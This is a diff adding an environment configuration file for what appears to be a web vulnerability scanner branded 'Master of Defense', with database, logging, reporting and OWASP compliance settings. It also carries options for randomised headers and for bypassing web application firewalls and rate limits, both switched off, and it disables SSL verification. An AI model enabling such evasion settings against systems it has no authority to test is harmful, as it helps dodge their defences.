+DB_TYPE=sqlite
+DB_PATH=./data/scans.db
+LOG_LEVEL=INFO
+LOG_DIR=./logs
+SLACK_WEBHOOK=
+TEAMS_WEBHOOK=
+GITHUB_TOKEN=
+GITLAB_TOKEN=
+JIRA_URL=
+JIRA_TOKEN=
+PROXY_URL=
+PROXY_USERNAME=
+PROXY_PASSWORD=
+MAX_THREADS=50
+TIMEOUT=30
+REQUEST_DELAY=0.5
+VERIFY_SSL=False
+ALLOW_COOKIES=True
+FOLLOW_REDIRECTS=True
+RETRY_ATTEMPTS=3
+USER_AGENT=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+CONCURRENT_SCANS=10
+BATCH_SIZE=100
+CONNECTION_POOL_SIZE=50
+MEMORY_LIMIT=1024
+ENABLE_COMPRESSION=True
+ENABLE_CACHING=True
+OPTIMIZATION_LEVEL=High
+RANDOMIZE_HEADERS=True
+WAF_BYPASS=False
+RATE_LIMIT_BYPASS=False
+CACHE_TTL=3600
+CACHE_MAX_SIZE=1000
+CACHE_STRATEGY=LRU
+REDIS_ENABLED=False
+REDIS_HOST=localhost
+REDIS_PORT=6379
+LOG_TO_FILE=True
+LOG_TO_CONSOLE=True
+MAX_LOG_SIZE=100
+LOG_RETENTION_DAYS=30
+VERBOSE_LOGGING=False
+COMPLIANCE_FRAMEWORK=OWASP Top 10
+AUTO_COMPLIANCE_REPORT=True
+INCLUDE_REMEDIATION=True
+SEVERITY_THRESHOLD=Medium
+DATA_RETENTION_DAYS=365
+SCAN_RESULTS_DIR=./results
+REPORT_FORMAT=PDF
+ENABLE_PDF_EXPORT=True
+ENABLE_HTML_EXPORT=True
+ENABLE_JSON_EXPORT=True
+ENABLE_EXCEL_EXPORT=False
+DATABASE_BACKUP_ENABLED=True
+DATABASE_BACKUP_DIR=./backups
+DATABASE_BACKUP_INTERVAL=24
+
+================================================================================
+END OF DATA & CONFIG FILES (52-63)
+================================================================================
+
+TOTAL DATA FILES: 12 files
+TOTAL LINES: ~2,500+ lines
+
+تمام فایل‌های داده و تنظیمات کامل و آماده برای استفاده
+
+© 2025 MoD - Master of Defense
+================================================================================
